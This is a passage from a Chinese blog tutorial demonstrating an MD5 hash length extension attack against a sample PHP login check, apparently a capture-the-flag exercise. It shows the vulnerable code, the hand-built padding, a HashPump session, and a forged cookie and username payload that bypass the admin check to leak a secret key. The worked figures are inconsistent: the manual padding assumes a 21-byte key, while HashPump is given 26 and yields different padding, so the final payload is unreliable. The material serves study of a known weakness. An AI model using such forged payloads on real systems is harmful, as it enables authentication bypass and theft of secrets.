<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/106534008?utm_source=wechat_session">Demo</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&#x27;username&#x27;]; </span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&#x27;verify&#x27;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        echo $key;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的md5($key.$text) 就相当于上面str1的Hash值，分组1是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$key(21字节) + &quot;guest&quot;(5字节) + &quot;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;(30字节) + &quot;\x00\x00\x00\x00\x00\x00\x00\xd0&quot;(8字节)</span><br></pre></td></tr></table></figure>

<p>根据前面的原理，我们构造一个str2，让它的分组1和str1的分组1相同，分组2为包含<code>admin</code>用以绕过检查。然后用str1的分组1（已知，即str1的hash值高低位互换）计算出str2的hash值。</p>
<p>str2字符串的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$key(21字节) + &quot;guest&quot;(5字节) + &quot;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;(30字节) + &quot;\x00\x00\x00\x00\x00\x00\x00\xd0&quot;(8字节) + &quot;admin&quot;</span><br></pre></td></tr></table></figure>

<p>Hashdump可以帮我们自动化计算:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali2018:~/md5/HashPump# ./hashpump </span><br><span class="line">Input Signature: f8d7a112644f7e71e1e8ad068f144f61 [已知str1的hash值]</span><br><span class="line">Input Data: guest [username, hash中已知的data]</span><br><span class="line">Input Key Length: 26  [length($key + guest)]</span><br><span class="line">Input Data to Add: admin [用来绕过admin检查]</span><br><span class="line">84b4590d78bf2a8cdd5612cad68e4ab5 [str2的hash]</span><br><span class="line">guest\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure>


<p>所以提交<code>$_COOKIE[&#39;verify&#39;]=84b4590d78bf2a8cdd5612cad68e4ab5</code>，<code>username=guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%f8%00%00%00%00%00%00%00admin</code>即可。</p>
<p><img src="4.png" alt="image"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pcat/p/5478509.html">https://www.cnblogs.com/pcat/p/5478509.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/syh_486_007/article/details/51228628">https://blog.csdn.net/syh_486_007/article/details/51228628</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/69264.html">https://www.freebuf.com/articles/web/69264.html</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">欣海余诚</span>

  
</div>


  <!--  <div class="powered-by">
  由 <a class="theme-link" target="_blank" href="http    s://hexo.io">Hexo</a> 强力驱动
</div>



  <span class="post-meta-divider">|</span>


  <div class="theme-info">
主题 &mdash;
  <a class="theme-link" target="_blank" href="https://github.com/iissnan/he    xo-theme-next"></div>

<br/>
<!-- 不蒜子统计 -->
    <span id="busuanzi_container_site_pv">
            本站总访问量<span id="busuanzi_value_site_pv"></span>次
    </span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv" style='display:none'>
            本站访客数<span id="busuanzi_value_site_uv"></span>人
    </span>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  














  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
